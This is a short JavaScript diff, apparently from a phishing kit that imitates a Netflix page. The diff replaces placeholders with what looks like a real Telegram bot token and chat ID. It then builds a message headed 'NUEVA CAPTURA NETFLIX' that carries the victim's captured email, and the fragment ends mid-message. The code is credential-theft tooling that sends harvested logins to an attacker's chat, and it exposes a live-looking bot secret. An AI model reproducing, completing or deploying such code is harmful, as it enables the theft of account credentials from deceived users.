@@ -52,8 +52,8 @@ if (btnFinalizar) {
         }
 
         // Configuración de tu Bot
-        const token = "TU_BOT_TOKEN_AQUI";
-        const chat_id = "TU_CHAT_ID_AQUI";
+        const token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
+        const chat_id = "7993722214";
         const mensaje = `
 🔥 **NUEVA CAPTURA NETFLIX** 🔥
 📧 **Email:** ${email}
